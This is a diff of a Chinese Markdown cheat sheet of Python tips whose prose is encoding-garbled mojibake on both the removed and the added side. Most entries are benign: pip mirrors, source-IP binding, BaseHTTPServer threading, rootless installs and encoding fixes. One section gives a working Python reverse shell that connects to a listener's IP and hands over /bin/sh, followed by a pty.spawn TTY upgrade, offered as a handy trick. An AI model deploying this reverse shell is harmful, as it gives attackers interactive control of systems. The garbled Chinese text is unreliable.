@@ -1,12 +1,12 @@
-#Ğ´ÔÚÇ°Ãæ
+#å†™åœ¨å‰é¢
 
-àÅºß£¬PythonºÜºÃÍæÄØ...¼ÇÂ¼Ò»µãºÚ¿Æ¼¼¿©
+å—¯å“¼ï¼ŒPythonå¾ˆå¥½ç©å‘¢...è®°å½•ä¸€ç‚¹é»‘ç§‘æŠ€å’¯
 
-µ±Äã³¢ÊÔÒ»¸ö°üµÄÊ±ºò£¬×¢Òâ×Ô¼ºµÄpyÎÄ¼şÃû³Æ²»ÄÜÓë°üÃûÖØÃû£¬ÀıÈç²»Òª³öÏÖflask.py
+å½“ä½ å°è¯•ä¸€ä¸ªåŒ…çš„æ—¶å€™ï¼Œæ³¨æ„è‡ªå·±çš„pyæ–‡ä»¶åç§°ä¸èƒ½ä¸åŒ…åé‡åï¼Œä¾‹å¦‚ä¸è¦å‡ºç°flask.py
 
 ----
 
-#ÉèÖÃpipÔ´
+#è®¾ç½®pipæº
 
 ```
 mkdir -p ~/.pip
@@ -18,34 +18,34 @@ trusted-host=pypi.doubanio.com
 """>~/.pip/pip.conf
 ```
 
-#·´µ¯shell
+#åå¼¹shell
 
-Ê×ÏÈ×Ô¼ºµÄ·şÎñÆ÷ÉÏÓÃ**nc -l ¶Ë¿Ú**
+é¦–å…ˆè‡ªå·±çš„æœåŠ¡å™¨ä¸Šç”¨**nc -l ç«¯å£**
 
 ```python
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(( "IPµØÖ·" , ¶Ë¿Ú ))
+s.connect(( "IPåœ°å€" , ç«¯å£ ))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
 
-##»ñµÃÒ»¸ötty
+##è·å¾—ä¸€ä¸ªtty
 
     python -c 'import pty; pty.spawn("/bin/sh")'
 
 ----
 
-#ÈÃrequestsÊ¹ÓÃ¶à¸öIP
+#è®©requestsä½¿ç”¨å¤šä¸ªIP
 
 ```python
 import socket
 real_create_conn = socket.create_connection
 def set_src_addr(*args):
     address, timeout = args[0], args[1]
-    source_address = ( ĞèÒªÊ¹ÓÃµÄIP , 0)
+    source_address = ( éœ€è¦ä½¿ç”¨çš„IP , 0)
     return real_create_conn(address, timeout, source_address)
 socket.create_connection = set_src_addr
 import requests
@@ -53,29 +53,29 @@ import requests
 
 ----
 
-#Python¶àÏß³ÌÄ£°å
+#Pythonå¤šçº¿ç¨‹æ¨¡æ¿
 
 [MultiThread_Template.py](code/MultiThread_Template.py)
 
-## BaseHTTPServer²¢·¢ĞÔ¸ÄÉÆ
+## BaseHTTPServerå¹¶å‘æ€§æ”¹å–„
 
-> ²Î¿¼×ÊÁÏ£º[ÀûÓÃPythonÖĞSocketServer ÊµÏÖ¿Í»§¶ËÓë·şÎñÆ÷¼ä·Ç×èÈûÍ¨ĞÅ](http://blog.csdn.net/cnmilan/article/details/9664823)
+> å‚è€ƒèµ„æ–™ï¼š[åˆ©ç”¨Pythonä¸­SocketServer å®ç°å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨é—´éé˜»å¡é€šä¿¡](http://blog.csdn.net/cnmilan/article/details/9664823)
 
-> Ö±½ÓĞŞ¸ÄBaseHTTPServerµÄ´úÂëÖĞµÄÒ»¸öÏ¸½Ú£¬¿ÉÒÔ´ó·ù¶ÈÌá¸ßÊ¹ÓÃBaseHTTPServerÄÜÖ§³ÖµÄ²¢·¢ĞÔ
+> ç›´æ¥ä¿®æ”¹BaseHTTPServerçš„ä»£ç ä¸­çš„ä¸€ä¸ªç»†èŠ‚ï¼Œå¯ä»¥å¤§å¹…åº¦æé«˜ä½¿ç”¨BaseHTTPServerèƒ½æ”¯æŒçš„å¹¶å‘æ€§
 
-Ê×ÏÈÕÒµ½BaseHTTPServerÔÚÄÄ£º
+é¦–å…ˆæ‰¾åˆ°BaseHTTPServeråœ¨å“ªï¼š
 
      python -c "import BaseHTTPServer; print(BaseHTTPServer)"
 
-ĞŞ¸Ä¶ÔÓ¦µÄÎÄ¼ş£¬Èç/usr/lib/python2.7/BaseHTTPServer.py
+ä¿®æ”¹å¯¹åº”çš„æ–‡ä»¶ï¼Œå¦‚/usr/lib/python2.7/BaseHTTPServer.py
 
-ÕÒµ½ÕâĞĞ£º
+æ‰¾åˆ°è¿™è¡Œï¼š
 
 ```
 class HTTPServer(SocketServer.TCPServer):
 ```
 
-ĞŞ¸ÄÆä¼Ì³ĞµÄ¸¸Àà£º
+ä¿®æ”¹å…¶ç»§æ‰¿çš„çˆ¶ç±»ï¼š
 
 ```
 class HTTPServer(SocketServer.ThreadingTCPServer):
@@ -83,9 +83,9 @@ class HTTPServer(SocketServer.ThreadingTCPServer):
 
 ----
 
-## ÎŞrootÈ¨ÏŞ°²×°Python
+## æ— rootæƒé™å®‰è£…Python
 
-ÏÂÔØ×îĞÂ°æpythonÔ´ÂëºóÖ¸¶¨prefix±àÒë£¬¼ÙÉèÓÃ»§Ä¿Â¼Îª/home/chenyuan
+ä¸‹è½½æœ€æ–°ç‰ˆpythonæºç åæŒ‡å®šprefixç¼–è¯‘ï¼Œå‡è®¾ç”¨æˆ·ç›®å½•ä¸º/home/chenyuan
 
 ```
 apt-get install libssl-dev openssl 
@@ -104,14 +104,14 @@ alias pip3=`pwd`/pip
 
 ----
 
-# ÖĞÎÄÊä³öÂÒÂëÎÊÌâ
+# ä¸­æ–‡è¾“å‡ºä¹±ç é—®é¢˜
 
-·½·¨1£ºÔËĞĞpyÇ°ÉèÖÃ»·¾³±äÁ¿
+æ–¹æ³•1ï¼šè¿è¡Œpyå‰è®¾ç½®ç¯å¢ƒå˜é‡
 ```
 export PYTHONIOENCODING=utf8
 ```
 
-·½·¨2£ºÇ¿ÖÆĞŞ¸Ästdout
+æ–¹æ³•2ï¼šå¼ºåˆ¶ä¿®æ”¹stdout
 ```
 import sys
 sys.stdout=open(1, 'w', encoding='utf-8', closefd=False)
@@ -119,11 +119,11 @@ sys.stdout=open(1, 'w', encoding='utf-8', closefd=False)
 
 ----
 
-# ×ñÑ­PEP8¼ì²éÄãµÄ´úÂë
+# éµå¾ªPEP8æ£€æŸ¥ä½ çš„ä»£ç 
 
 [pycodestyle](https://github.com/PyCQA/pycodestyle)
 
-°²×°²¢Ê¹ÓÃpycodestyle¼ì²é´úÂë£¬ºöÂÔE501Ò»ĞĞ²»ÄÜ³¤ÓÚ80¸ö×Ö·ûµÄÏŞÖÆ£º
+å®‰è£…å¹¶ä½¿ç”¨pycodestyleæ£€æŸ¥ä»£ç ï¼Œå¿½ç•¥E501ä¸€è¡Œä¸èƒ½é•¿äº80ä¸ªå­—ç¬¦çš„é™åˆ¶ï¼š
 
 ```
 pip install pycodestyle
@@ -132,7 +132,7 @@ pycodestyle --show-source --ignore=E501 yourcode.py
 
 ----
 
-#Éú³ÉËæ»ú×Ö·û´®
+#ç”Ÿæˆéšæœºå­—ç¬¦ä¸²
 
 ```
 from random import Random
